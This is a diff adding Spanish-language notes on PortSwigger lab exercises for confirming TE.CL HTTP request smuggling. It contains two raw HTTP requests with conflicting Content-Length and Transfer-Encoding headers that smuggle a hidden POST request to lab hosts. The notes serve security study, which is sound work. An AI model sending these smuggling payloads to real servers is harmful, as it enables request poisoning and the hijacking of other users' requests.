@@ -158,8 +158,65 @@ X-Ignore: X
 Como nota se agarra la primera peticon la que se hace a la raiz y se envia 2 veces.
 
 
+# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+Para este laboratorio observo que el Trasfer-Encoding es el que acepta el front end y el Content-Length es el que acepta el backend si te das cuenta como se
+quiere que el back interprete la siguiente peticion de lo que nosotros le inyectemos se sa Coten:
+
+```
+POST / HTTP/1.1
+Host: 0ac300f5049f93aac01f310600df0059.web-security-academy.net
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+
+Nota siempre quito todo lo anterior de la peticion pero hasta User-Agent y siempre me ha funcionado. Lo que se busca es que 
+al mandar una segunda peticion e servidor interprete la peticion maliciosa que nosotros le enviamos.
+
+
+# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+Para este ab ek backend maneja el largo de las peticiones con Content-Lenght si envias get no lo permite reuerda que las peticiones get no tienen cuerpo
+es por eso que se necesita enviar por POST.
+
+```
+
+POST / HTTP/1.1
+Host: 0a71003e0350d78cd03aa36400420084.web-security-academy.net
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
 
 
 
+```
 
 > https://portswigger.net/web-security/request-smuggling
